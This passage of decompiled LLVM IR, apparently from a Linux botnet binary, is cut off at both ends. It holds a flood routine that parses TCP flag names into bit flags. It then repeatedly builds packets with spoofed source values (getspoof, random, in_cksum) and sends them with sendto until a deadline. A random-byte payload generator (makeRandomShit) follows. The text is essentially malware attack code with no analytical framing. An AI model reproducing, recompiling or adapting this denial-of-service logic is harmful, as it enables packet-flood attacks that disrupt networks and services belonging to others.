  %v1_804ea95 = icmp eq i1 %v15_804ea8c, false
  br i1 %v1_804ea95, label %dec_label_pc_804eaa5, label %dec_label_pc_804ea97

dec_label_pc_804ea97:                             ; preds = %dec_label_pc_804ea52
  %v2_804ea90 = sext i8 %v4_804ea8c to i32
  %v4_804ea97 = zext i8 %stack_var_-87.155 to i32
  %v6_804ea97 = and i32 %v2_804ea90, -256
  %v7_804ea97 = or i32 %v4_804ea97, %v6_804ea97
  %v1_804ea9a = or i32 %v7_804ea97, 2
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804ea9a = trunc i32 %v1_804ea9a to i8
  store i32 %v1_804ea9a, i32* @eax, align 4
  br label %dec_label_pc_804ec3c

dec_label_pc_804eaa5:                             ; preds = %dec_label_pc_804ea52
  store i1 false, i1* @df, align 1
  store i32 %v3_804ebee.in, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8069a04.200 to i32), i32* @edi, align 4
  %v7_804ead5 = call i32 @_strncmp(i8* %v3_804ebee, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8069a04.200, i32 0, i32 0), i32 4)
  %v8_804ead5 = urem i32 %v7_804ead5, 2
  %v9_804ead5 = icmp eq i32 %v8_804ead5, 0
  %v0_804ead7 = load i1, i1* %cf.global-to-local, align 1
  %v2_804ead7 = or i1 %v0_804ead7, %v9_804ead5
  %v3_804ead7 = zext i1 %v2_804ead7 to i32
  %v4_804ead7 = load i32, i32* @edx, align 4
  %v5_804ead7 = and i32 %v4_804ead7, -256
  %v6_804ead7 = or i32 %v3_804ead7, %v5_804ead7
  %v7_804ead7 = xor i32 %v6_804ead7, 1
  store i32 %v7_804ead7, i32* @edx, align 4
  %v3_804eadd = and i32 %v7_804ead5, -256
  %v1_804eadf = trunc i32 %v7_804ead7 to i8
  %v3_804eadf = zext i1 %v0_804ead7 to i8
  %v4_804eadf = sub nsw i8 %v1_804eadf, %v3_804eadf
  %v15_804eadf = icmp eq i8 %v4_804eadf, 0
  %v20_804eadf = zext i8 %v4_804eadf to i32
  %v23_804eadf = or i32 %v20_804eadf, %v3_804eadd
  store i32 %v23_804eadf, i32* @ecx, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804eae8 = icmp eq i1 %v15_804eadf, false
  br i1 %v1_804eae8, label %dec_label_pc_804eaf8, label %dec_label_pc_804eaea

dec_label_pc_804eaea:                             ; preds = %dec_label_pc_804eaa5
  %v2_804eae3 = sext i8 %v4_804eadf to i32
  %v4_804eaea = zext i8 %stack_var_-87.155 to i32
  %v6_804eaea = and i32 %v2_804eae3, -256
  %v7_804eaea = or i32 %v4_804eaea, %v6_804eaea
  %v1_804eaed = or i32 %v7_804eaea, 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804eaed = trunc i32 %v1_804eaed to i8
  store i32 %v1_804eaed, i32* @eax, align 4
  br label %dec_label_pc_804ec3c

dec_label_pc_804eaf8:                             ; preds = %dec_label_pc_804eaa5
  store i1 false, i1* @df, align 1
  store i32 %v3_804ebee.in, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8069a08.201 to i32), i32* @edi, align 4
  %v7_804eb28 = call i32 @_strncmp(i8* %v3_804ebee, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8069a08.201, i32 0, i32 0), i32 4)
  %v8_804eb28 = urem i32 %v7_804eb28, 2
  %v9_804eb28 = icmp eq i32 %v8_804eb28, 0
  %v0_804eb2a = load i1, i1* %cf.global-to-local, align 1
  %v2_804eb2a = or i1 %v0_804eb2a, %v9_804eb28
  %v3_804eb2a = zext i1 %v2_804eb2a to i32
  %v4_804eb2a = load i32, i32* @edx, align 4
  %v5_804eb2a = and i32 %v4_804eb2a, -256
  %v6_804eb2a = or i32 %v3_804eb2a, %v5_804eb2a
  %v7_804eb2a = xor i32 %v6_804eb2a, 1
  store i32 %v7_804eb2a, i32* @edx, align 4
  %v3_804eb30 = and i32 %v7_804eb28, -256
  %v1_804eb32 = trunc i32 %v7_804eb2a to i8
  %v3_804eb32 = zext i1 %v0_804eb2a to i8
  %v4_804eb32 = sub nsw i8 %v1_804eb32, %v3_804eb32
  %v15_804eb32 = icmp eq i8 %v4_804eb32, 0
  %v20_804eb32 = zext i8 %v4_804eb32 to i32
  %v23_804eb32 = or i32 %v20_804eb32, %v3_804eb30
  store i32 %v23_804eb32, i32* @ecx, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804eb3b = icmp eq i1 %v15_804eb32, false
  br i1 %v1_804eb3b, label %dec_label_pc_804eb4b, label %dec_label_pc_804eb3d

dec_label_pc_804eb3d:                             ; preds = %dec_label_pc_804eaf8
  %v2_804eb36 = sext i8 %v4_804eb32 to i32
  %v4_804eb3d = zext i8 %stack_var_-87.155 to i32
  %v6_804eb3d = and i32 %v2_804eb36, -256
  %v7_804eb3d = or i32 %v4_804eb3d, %v6_804eb3d
  %v1_804eb40 = or i32 %v7_804eb3d, 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804eb40 = trunc i32 %v1_804eb40 to i8
  store i32 %v1_804eb40, i32* @eax, align 4
  br label %dec_label_pc_804ec3c

dec_label_pc_804eb4b:                             ; preds = %dec_label_pc_804eaf8
  store i1 false, i1* @df, align 1
  store i32 %v3_804ebee.in, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8069a0c.202 to i32), i32* @edi, align 4
  %v7_804eb7b = call i32 @_strncmp(i8* %v3_804ebee, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8069a0c.202, i32 0, i32 0), i32 4)
  %v8_804eb7b = urem i32 %v7_804eb7b, 2
  %v9_804eb7b = icmp eq i32 %v8_804eb7b, 0
  %v0_804eb7d = load i1, i1* %cf.global-to-local, align 1
  %v2_804eb7d = or i1 %v0_804eb7d, %v9_804eb7b
  %v3_804eb7d = zext i1 %v2_804eb7d to i32
  %v4_804eb7d = load i32, i32* @edx, align 4
  %v5_804eb7d = and i32 %v4_804eb7d, -256
  %v6_804eb7d = or i32 %v3_804eb7d, %v5_804eb7d
  %v7_804eb7d = xor i32 %v6_804eb7d, 1
  store i32 %v7_804eb7d, i32* @edx, align 4
  %v3_804eb83 = and i32 %v7_804eb7b, -256
  %v1_804eb85 = trunc i32 %v7_804eb7d to i8
  %v3_804eb85 = zext i1 %v0_804eb7d to i8
  %v4_804eb85 = sub nsw i8 %v1_804eb85, %v3_804eb85
  %v15_804eb85 = icmp eq i8 %v4_804eb85, 0
  %v20_804eb85 = zext i8 %v4_804eb85 to i32
  %v23_804eb85 = or i32 %v20_804eb85, %v3_804eb83
  store i32 %v23_804eb85, i32* @ecx, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804eb8e = icmp eq i1 %v15_804eb85, false
  br i1 %v1_804eb8e, label %dec_label_pc_804eb9e, label %dec_label_pc_804eb90

dec_label_pc_804eb90:                             ; preds = %dec_label_pc_804eb4b
  %v2_804eb89 = sext i8 %v4_804eb85 to i32
  %v4_804eb90 = zext i8 %stack_var_-87.155 to i32
  %v6_804eb90 = and i32 %v2_804eb89, -256
  %v7_804eb90 = or i32 %v4_804eb90, %v6_804eb90
  %v1_804eb93 = or i32 %v7_804eb90, 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804eb93 = trunc i32 %v1_804eb93 to i8
  store i32 %v1_804eb93, i32* @eax, align 4
  br label %dec_label_pc_804ec3c

dec_label_pc_804eb9e:                             ; preds = %dec_label_pc_804eb4b
  store i1 false, i1* @df, align 1
  store i32 %v3_804ebee.in, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8069a10.203 to i32), i32* @edi, align 4
  %v7_804ebce = call i32 @_strncmp(i8* %v3_804ebee, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8069a10.203, i32 0, i32 0), i32 4)
  %v8_804ebce = urem i32 %v7_804ebce, 2
  %v9_804ebce = icmp eq i32 %v8_804ebce, 0
  %v0_804ebd0 = load i1, i1* %cf.global-to-local, align 1
  %v2_804ebd0 = or i1 %v0_804ebd0, %v9_804ebce
  %v3_804ebd0 = zext i1 %v2_804ebd0 to i32
  %v4_804ebd0 = load i32, i32* @edx, align 4
  %v5_804ebd0 = and i32 %v4_804ebd0, -256
  %v6_804ebd0 = or i32 %v3_804ebd0, %v5_804ebd0
  %v7_804ebd0 = xor i32 %v6_804ebd0, 1
  store i32 %v7_804ebd0, i32* @edx, align 4
  %v3_804ebd6 = and i32 %v7_804ebce, -256
  %v1_804ebd8 = trunc i32 %v7_804ebd0 to i8
  %v3_804ebd8 = zext i1 %v0_804ebd0 to i8
  %v4_804ebd8 = sub nsw i8 %v1_804ebd8, %v3_804ebd8
  %v15_804ebd8 = icmp eq i8 %v4_804ebd8, 0
  %v20_804ebd8 = zext i8 %v4_804ebd8 to i32
  %v23_804ebd8 = or i32 %v20_804ebd8, %v3_804ebd6
  store i32 %v23_804ebd8, i32* @ecx, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ebe1 = icmp eq i1 %v15_804ebd8, false
  br i1 %v1_804ebe1, label %dec_label_pc_804ebee, label %dec_label_pc_804ebe3

dec_label_pc_804ebe3:                             ; preds = %dec_label_pc_804eb9e
  %v2_804ebdc = sext i8 %v4_804ebd8 to i32
  %v4_804ebe3 = zext i8 %stack_var_-87.155 to i32
  %v6_804ebe3 = and i32 %v2_804ebdc, -256
  %v7_804ebe3 = or i32 %v4_804ebe3, %v6_804ebe3
  %v1_804ebe6 = or i32 %v7_804ebe3, 8
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804ebe6 = trunc i32 %v1_804ebe6 to i8
  store i32 %v1_804ebe6, i32* @eax, align 4
  br label %dec_label_pc_804ec3c

dec_label_pc_804ebee:                             ; preds = %dec_label_pc_804eb9e
  store i1 false, i1* @df, align 1
  store i32 %v3_804ebee.in, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8069a14.204 to i32), i32* @edi, align 4
  %v7_804ec1e = call i32 @_strncmp(i8* %v3_804ebee, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8069a14.204, i32 0, i32 0), i32 4)
  %v8_804ec1e = urem i32 %v7_804ec1e, 2
  %v9_804ec1e = icmp eq i32 %v8_804ec1e, 0
  %v0_804ec20 = load i1, i1* %cf.global-to-local, align 1
  %v2_804ec20 = or i1 %v0_804ec20, %v9_804ec1e
  %v3_804ec20 = zext i1 %v2_804ec20 to i32
  %v4_804ec20 = load i32, i32* @edx, align 4
  %v5_804ec20 = and i32 %v4_804ec20, -256
  %v6_804ec20 = or i32 %v3_804ec20, %v5_804ec20
  %v7_804ec20 = xor i32 %v6_804ec20, 1
  store i32 %v7_804ec20, i32* @edx, align 4
  %v3_804ec26 = and i32 %v7_804ec1e, -256
  %v1_804ec28 = trunc i32 %v7_804ec20 to i8
  %v3_804ec28 = zext i1 %v0_804ec20 to i8
  %v4_804ec28 = sub nsw i8 %v1_804ec28, %v3_804ec28
  %v15_804ec28 = icmp eq i8 %v4_804ec28, 0
  %v20_804ec28 = zext i8 %v4_804ec28 to i32
  %v23_804ec28 = or i32 %v20_804ec28, %v3_804ec26
  store i32 %v23_804ec28, i32* @ecx, align 4
  %v2_804ec2c = sext i8 %v4_804ec28 to i32
  store i32 %v2_804ec2c, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ec31 = icmp eq i1 %v15_804ec28, false
  br i1 %v1_804ec31, label %dec_label_pc_804ec3c, label %dec_label_pc_804ec33

dec_label_pc_804ec33:                             ; preds = %dec_label_pc_804ebee
  %v4_804ec33 = zext i8 %stack_var_-87.155 to i32
  %v6_804ec33 = and i32 %v2_804ec2c, -256
  %v7_804ec33 = or i32 %v4_804ec33, %v6_804ec33
  %v1_804ec36 = or i32 %v7_804ec33, 32
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804ec36 = trunc i32 %v1_804ec36 to i8
  store i32 %v1_804ec36, i32* @eax, align 4
  br label %dec_label_pc_804ec3c

dec_label_pc_804ec3c:                             ; preds = %dec_label_pc_804ebee, %dec_label_pc_804ebe3, %dec_label_pc_804eb90, %dec_label_pc_804eb3d, %dec_label_pc_804eaea, %dec_label_pc_804ea97, %dec_label_pc_804ec33
  %stack_var_-87.0 = phi i8 [ %stack_var_-87.155, %dec_label_pc_804ebee ], [ %v3_804ec36, %dec_label_pc_804ec33 ], [ %v3_804ebe6, %dec_label_pc_804ebe3 ], [ %v3_804eb93, %dec_label_pc_804eb90 ], [ %v3_804eb40, %dec_label_pc_804eb3d ], [ %v3_804eaed, %dec_label_pc_804eaea ], [ %v3_804ea9a, %dec_label_pc_804ea97 ]
  %v0_804ec3c = load i32, i32* @esp, align 4
  %v5_804ec3c = icmp ult i32 %v0_804ec3c, 8
  store i1 %v5_804ec3c, i1* %cf.global-to-local, align 1
  %v2_804ec46 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_80699fe.198 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_804ec51 = icmp eq i32 %v2_804ec46, 0
  %v1_804ec55 = icmp eq i1 %v5_804ec51, false
  br i1 %v1_804ec55, label %dec_label_pc_804ea52, label %dec_label_pc_804ec5b

dec_label_pc_804ec5b:                             ; preds = %dec_label_pc_804ec3c, %dec_label_pc_804ea31, %dec_label_pc_804ea11, %dec_label_pc_804e9b0, %dec_label_pc_804e94f, %dec_label_pc_804e8e5, %dec_label_pc_804e860
  %v2_804ed07 = ptrtoint i8* %stack_var_-120 to i32
  %v2_804ed85 = ptrtoint i16* %stack_var_-172 to i32
  %v2_804ed8b = ptrtoint i32* %stack_var_-160 to i32
  %v15_804ed91 = ptrtoint i16* %stack_var_-100 to i32
  %v12_804edaf = ptrtoint i32* %stack_var_-140 to i32
  %v5_804edb6 = icmp ugt i8* %stack_var_-120, inttoptr (i32 -41 to i8*)
  %v15_804edb6 = ptrtoint i32* %stack_var_-80 to i32
  %v2_804eddc = ptrtoint i32* %stack_var_-188 to i32
  %v5_804ee18 = add i32 %v1_804e758, %v2_804e6a1
  br label %dec_label_pc_804ec8c

dec_label_pc_804ec8c:                             ; preds = %dec_label_pc_804ee30, %dec_label_pc_804ec5b
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_804ec5b ], [ %v4_804ee30, %dec_label_pc_804ee30 ]
  %v0_804ec8c = load i32, i32* @esp, align 4
  %v5_804ec8c = icmp ult i32 %v0_804ec8c, 8
  store i1 %v5_804ec8c, i1* %cf.global-to-local, align 1
  %v5_804ec8f = add i32 %v0_804ec8c, -12
  %v6_804ec8f = inttoptr i32 %v5_804ec8f to i32*
  store i32 31, i32* %v6_804ec8f, align 4
  %v1_804ec92 = add i32 %v0_804ec8c, -16
  %v2_804ec92 = inttoptr i32 %v1_804ec92 to i32*
  store i32 0, i32* %v2_804ec92, align 4
  %v1_804ec94 = load i32, i32* %stack_var_-160, align 4
  %v3_804ec94 = call i32 @realrand(i32 0, i32 %v1_804ec94)
  %v0_804ec99 = load i32, i32* @esp, align 4
  %v2_804ec99 = icmp ugt i32 %v0_804ec99, -17
  store i1 %v2_804ec99, i1* %cf.global-to-local, align 1
  %v0_804ec9c = load i32, i32* @ebp, align 4
  %v2_804ec9c = mul i32 %v3_804ec94, 4
  %v3_804ec9c = add i32 %v2_804ec9c, -392
  %v4_804ec9c = add i32 %v3_804ec9c, %v0_804ec9c
  %v5_804ec9c = inttoptr i32 %v4_804ec9c to i32*
  %v6_804ec9c = load i32, i32* %v5_804ec9c, align 4
  %sext30 = mul i32 %v6_804ec9c, 65536
  %v1_804eca6 = sdiv i32 %sext30, 65536
  %v2_804eca6 = call i32 @getspoof(i32 %v1_804eca6)
  %v3_804eca6 = trunc i32 %v2_804eca6 to i16
  %v0_804ecb9 = load i32, i32* @esp, align 4
  %v5_804ecb9 = icmp ult i32 %v0_804ecb9, 12
  store i1 %v5_804ecb9, i1* %cf.global-to-local, align 1
  %v2_804ecbc = add i32 %v0_804ecb9, -16
  %v3_804ecbc = inttoptr i32 %v2_804ecbc to i32*
  store i32 60, i32* %v3_804ecbc, align 4
  %sext33 = mul i32 %v2_804eca6, 65536
  %v1_804ecbd = sdiv i32 %sext33, 65536
  %v2_804ecbd = call i32 @htons(i32 %v1_804ecbd)
  %v0_804ecc2 = load i32, i32* @esp, align 4
  %v2_804ecc2 = icmp ugt i32 %v0_804ecc2, -17
  store i1 %v2_804ecc2, i1* %cf.global-to-local, align 1
  %v1_804ecc9 = call i32 @random()
  store i16 %v3_804eca6, i16* %stack_var_-100, align 2
  %v1_804ecec = call i32 @random()
  %v0_804ed0a = load i32, i32* @esp, align 4
  %v1_804ed0a = add i32 %v0_804ed0a, -4
  %v2_804ed0a = inttoptr i32 %v1_804ed0a to i32*
  store i32 20, i32* %v2_804ed0a, align 4
  %v2_804ed0c = add i32 %v0_804ed0a, -8
  %v3_804ed0c = inttoptr i32 %v2_804ed0c to i32*
  store i32 %v2_804ed07, i32* %v3_804ed0c, align 4
  %v3_804ed0d = inttoptr i32 %v1_804eca6 to i16*
  %v4_804ed0d = call i32 @in_cksum(i16* %v3_804ed0d, i32 %v2_804e741)
  %v0_804ed12 = load i32, i32* @esp, align 4
  %v5_804ed12 = icmp ugt i32 %v0_804ed12, -9
  store i1 %v5_804ed12, i1* %cf.global-to-local, align 1
  %v1_804ed19 = call i32 @random()
  store i16 %v3_804eca6, i16* %stack_var_-172, align 2
  %v0_804ed72 = load i32, i32* @esp, align 4
  %v5_804ed72 = icmp ult i32 %v0_804ed72, 12
  store i1 %v5_804ed72, i1* %cf.global-to-local, align 1
  %v2_804ed75 = add i32 %v0_804ed72, -16
  %v3_804ed75 = inttoptr i32 %v2_804ed75 to i32*
  store i32 40, i32* %v3_804ed75, align 4
  %sext62 = mul i32 %v1_804ed19, 16777216
  %v1_804ed76 = sdiv i32 %sext62, 16777216
  %v2_804ed76 = call i32 @htons(i32 %v1_804ed76)
  %v0_804ed7b = load i32, i32* @esp, align 4
  store i32 %v2_804ed8b, i32* %edx.global-to-local, align 4
  %tmp = and i32 %v0_804ed7b, -4
  %v5_804ed94 = icmp eq i32 %tmp, -16
  store i1 %v5_804ed94, i1* %cf.global-to-local, align 1
  %v1_804ed97 = add i32 %v0_804ed7b, 8
  %v2_804ed97 = inttoptr i32 %v1_804ed97 to i32*
  store i32 20, i32* %v2_804ed97, align 4
  %v2_804ed99 = add i32 %v0_804ed7b, 4
  %v3_804ed99 = inttoptr i32 %v2_804ed99 to i32*
  store i32 %v2_804ed8b, i32* %v3_804ed99, align 4
  %v3_804ed9a = inttoptr i32 %v0_804ed7b to i32*
  store i32 %v15_804ed91, i32* %v3_804ed9a, align 4
  %sext39 = mul i32 %v2_804ed76, 65536
  %v1_804ed9b = sdiv i32 %sext39, 65536
  %v4_804ed9b = call i32 @bcopy(i32 %v1_804ed9b, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804eda0 = load i32, i32* @esp, align 4
  %v5_804eda6 = add i32 %v0_804eda0, 8
  %v6_804eda6 = inttoptr i32 %v5_804eda6 to i32*
  store i32 20, i32* %v6_804eda6, align 4
  %v2_804edb2 = add i32 %v0_804eda0, 4
  %v3_804edb2 = inttoptr i32 %v2_804edb2 to i32*
  store i32 %v12_804edaf, i32* %v3_804edb2, align 4
  store i1 %v5_804edb6, i1* %cf.global-to-local, align 1
  %v3_804edb9 = inttoptr i32 %v0_804eda0 to i32*
  store i32 %v15_804edb6, i32* %v3_804edb9, align 4
  %v4_804edba = call i32 @bcopy(i32 %v1_804ed9b, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804edbf = load i32, i32* @esp, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  store i32 %v2_804ed85, i32* %edx.global-to-local, align 4
  %v2_804edce = add i32 %v0_804edbf, 12
  %v3_804edce = inttoptr i32 %v2_804edce to i32*
  store i32 52, i32* %v3_804edce, align 4
  %v2_804edcf = add i32 %v0_804edbf, 8
  %v3_804edcf = inttoptr i32 %v2_804edcf to i32*
  store i32 %v2_804ed85, i32* %v3_804edcf, align 4
  %v3_804edd0 = inttoptr i32 %v1_804ed9b to i16*
  %v4_804edd0 = call i32 @in_cksum(i16* %v3_804edd0, i32 ptrtoint (i32* @0 to i32))
  %v0_804edd5 = load i32, i32* @esp, align 4
  store i32 60, i32* %edx.global-to-local, align 4
  %v5_804ede8 = icmp ugt i32 %v0_804edd5, -9
  store i1 %v5_804ede8, i1* %cf.global-to-local, align 1
  %v1_804edeb = add i32 %v0_804edd5, -4
  %v2_804edeb = inttoptr i32 %v1_804edeb to i32*
  store i32 16, i32* %v2_804edeb, align 4
  %v2_804eded = add i32 %v0_804edd5, -8
  %v3_804eded = inttoptr i32 %v2_804eded to i32*
  store i32 %v2_804eddc, i32* %v3_804eded, align 4
  %v1_804edee = add i32 %v0_804edd5, -12
  %v2_804edee = inttoptr i32 %v1_804edee to i32*
  store i32 0, i32* %v2_804edee, align 4
  %v0_804edf0 = load i32, i32* %edx.global-to-local, align 4
  %v2_804edf0 = add i32 %v0_804edd5, -16
  %v3_804edf0 = inttoptr i32 %v2_804edf0 to i32*
  store i32 %v0_804edf0, i32* %v3_804edf0, align 4
  %v2_804edf4 = add i32 %v0_804edd5, -20
  %v3_804edf4 = inttoptr i32 %v2_804edf4 to i32*
  store i32 %v2_804ed07, i32* %v3_804edf4, align 4
  %v5_804edf5 = add i32 %v0_804edd5, -24
  %v6_804edf5 = inttoptr i32 %v5_804edf5 to i32*
  store i32 %v3_804e6ce, i32* %v6_804edf5, align 4
  %v1_804edf8 = load i32, i32* %stack_var_-80, align 4
  %sext42 = mul i32 %v4_804edd0, 65536
  %v2_804edf8 = sdiv i32 %sext42, 65536
  %v7_804edf8 = call i32 @sendto(i32 %v2_804edf8, i32 %v1_804edf8, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804edfd = load i32, i32* @esp, align 4
  %v8_804ee00 = icmp ult i32 %stack_var_-60.0, 99
  store i1 %v8_804ee00, i1* %cf.global-to-local, align 1
  %tmp167 = icmp ult i32 %stack_var_-60.0, 100
  br i1 %tmp167, label %dec_label_pc_804ee30, label %dec_label_pc_804ee06

dec_label_pc_804ee06:                             ; preds = %dec_label_pc_804ec8c
  %v1_804edfd = add i32 %v0_804edfd, 32
  %v5_804ee06 = icmp ult i32 %v1_804edfd, 12
  store i1 %v5_804ee06, i1* %cf.global-to-local, align 1
  %v1_804ee09 = add i32 %v0_804edfd, 16
  %v2_804ee09 = inttoptr i32 %v1_804ee09 to i32*
  store i32 0, i32* %v2_804ee09, align 4
  %v2_804ee0b = inttoptr i32 %v2_804edf8 to i32*
  %v3_804ee0b = call i32 @__GI_time(i32* %v2_804ee0b)
  %v0_804ee10 = load i32, i32* @esp, align 4
  store i32 %v3_804ee0b, i32* %edx.global-to-local, align 4
  %v7_804ee1b = icmp ult i32 %v3_804ee0b, %v5_804ee18
  store i1 %v7_804ee1b, i1* %cf.global-to-local, align 1
  br i1 %v7_804ee1b, label %dec_label_pc_804ee30, label %dec_label_pc_804ee1f

dec_label_pc_804ee1f:                             ; preds = %dec_label_pc_804ee06
  %v1_804ee10 = add i32 %v0_804ee10, 16
  %v5_804ee1f = icmp ult i32 %v1_804ee10, 12
  store i1 %v5_804ee1f, i1* %cf.global-to-local, align 1
  %v2_804ee22 = inttoptr i32 %v0_804ee10 to i32*
  store i32 0, i32* %v2_804ee22, align 4
  %v2_804ee24 = call i32 @__GI_exit(i32 %v2_804edf8)
  br label %dec_label_pc_804ee30

dec_label_pc_804ee30:                             ; preds = %dec_label_pc_804ee1f, %dec_label_pc_804ee06, %dec_label_pc_804ec8c
  %stack_var_-60.1 = phi i32 [ %stack_var_-60.0, %dec_label_pc_804ec8c ], [ 0, %dec_label_pc_804ee06 ], [ 0, %dec_label_pc_804ee1f ]
  %v4_804ee30 = add i32 %stack_var_-60.1, 1
  br label %dec_label_pc_804ec8c

dec_label_pc_804ee38:                             ; preds = %entry
  ret i32 %v1_804e6b2

; uselistorder directives
  uselistorder i32 %v2_804edf8, { 2, 1, 0 }
  uselistorder i32 %v0_804eda0, { 1, 0, 2 }
  uselistorder i32 %v1_804ed9b, { 2, 1, 0 }
  uselistorder i32 %v0_804ed7b, { 3, 1, 2, 0 }
  uselistorder i32 %v1_804eca6, { 1, 0 }
  uselistorder i32 %stack_var_-60.0, { 1, 0, 2 }
  uselistorder i32 %v2_804ec46, { 1, 0 }
  uselistorder i32 %v1_804ec36, { 1, 0 }
  uselistorder i1 %v0_804ec20, { 1, 0 }
  uselistorder i32 %v7_804ec1e, { 1, 0 }
  uselistorder i32 %v1_804ebe6, { 1, 0 }
  uselistorder i1 %v0_804ebd0, { 1, 0 }
  uselistorder i32 %v7_804ebce, { 1, 0 }
  uselistorder i32 %v1_804eb93, { 1, 0 }
  uselistorder i1 %v0_804eb7d, { 1, 0 }
  uselistorder i32 %v7_804eb7b, { 1, 0 }
  uselistorder i32 %v1_804eb40, { 1, 0 }
  uselistorder i1 %v0_804eb2a, { 1, 0 }
  uselistorder i32 %v7_804eb28, { 1, 0 }
  uselistorder i32 %v1_804eaed, { 1, 0 }
  uselistorder i1 %v0_804ead7, { 1, 0 }
  uselistorder i32 %v7_804ead5, { 1, 0 }
  uselistorder i32 %v1_804ea9a, { 1, 0 }
  uselistorder i1 %v0_804ea84, { 1, 0 }
  uselistorder i32 %v7_804ea82, { 1, 0 }
  uselistorder i1 %v0_804e9fe, { 1, 0 }
  uselistorder i32 %v7_804e9fc, { 1, 0 }
  uselistorder i1 %v0_804e99d, { 1, 0 }
  uselistorder i1 %v0_804e93c, { 1, 0 }
  uselistorder i1 %v0_804e8d2, { 1, 0 }
  uselistorder i1 %v0_804e84d, { 1, 0 }
  uselistorder i1 %v5_804e754, { 1, 0 }
  uselistorder i32 %v4_804e729, { 1, 0, 2 }
  uselistorder i32 %storemerge166, { 2, 3, 0, 1 }
  uselistorder i32 %v4_804e6e9, { 1, 0 }
  uselistorder i1 %v5_804e69c, { 1, 0, 2, 3 }
  uselistorder i16* %stack_var_-172, { 1, 0 }
  uselistorder i16* %stack_var_-100, { 1, 0 }
  uselistorder i32* %stack_var_-188, { 1, 0 }
  uselistorder i1* %cf.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 32, 14, 15, 16, 18, 17, 19, 21, 20, 22, 24, 23, 25, 27, 26, 28, 30, 29, 31, 70, 71, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 69, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68 }
  uselistorder i32 %arg4, { 2, 3, 1, 0 }
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804ec3c, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_804ea52, { 1, 0 }
  uselistorder label %dec_label_pc_804e718, { 1, 0 }
  uselistorder label %dec_label_pc_804e72c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804e6e9, { 1, 0 }
}

define i32 @makeRandomShit(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %v0_804ee42 = load i32, i32* @ebx, align 4
  %v2_804ee4b = call i32 @__GI_time(i32* null)
  %v1_804ee57 = call i32 @srand(i32 %v2_804ee4b)
  %v5_804ee74 = ptrtoint i8* %arg1 to i32
  %v5_804ee9a14 = icmp sgt i32 %tmp, 0
  br i1 %v5_804ee9a14, label %dec_label_pc_804ee6f, label %dec_label_pc_804ee9c

dec_label_pc_804ee6f:                             ; preds = %entry, %dec_label_pc_804ee6f
  %storemerge15 = phi i32 [ %v4_804ee91, %dec_label_pc_804ee6f ], [ 0, %entry ]
  %v6_804ee74 = add i32 %storemerge15, %v5_804ee74
  store i32 %v6_804ee74, i32* @ebx, align 4
  %v0_804ee77 = call i32 @random()
  store i32 255, i32* @ecx, align 4
  %v2_804ee87 = ashr i32 %v0_804ee77, 31
  %v2_804ee8a = zext i32 %v0_804ee77 to i64
  %v4_804ee8a = zext i32 %v2_804ee87 to i64
  %v5_804ee8a = mul nuw i64 %v4_804ee8a, 4294967296
  %v6_804ee8a = or i64 %v5_804ee8a, %v2_804ee8a
  %v10_804ee8a = srem i64 %v6_804ee8a, 255
  %v11_804ee8a = trunc i64 %v10_804ee8a to i8
  %v1_804ee8e = add i8 %v11_804ee8a, 1
  %v2_804ee8f = load i32, i32* @ebx, align 4
  %v3_804ee8f = inttoptr i32 %v2_804ee8f to i8*
  store i8 %v1_804ee8e, i8* %v3_804ee8f, align 1
  %v4_804ee91 = add nuw nsw i32 %storemerge15, 1
  %exitcond = icmp eq i32 %v4_804ee91, %tmp
  br i1 %exitcond, label %dec_label_pc_804ee9c, label %dec_label_pc_804ee6f

dec_label_pc_804ee9c:                             ; preds = %dec_label_pc_804ee6f, %entry
  %storemerge.lcssa = phi i32 [ 0, %entry ], [ %tmp, %dec_label_pc_804ee6f ]
  store i32 %v0_804ee42, i32* @ebx, align 4
  ret i32 %storemerge.lcssa

; uselistorder directives
  uselistorder i32 %v4_804ee91, { 1, 0 }
  uselistorder label %dec_label_pc_804ee6f, { 1, 0 }
}

define i32 @unknown(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
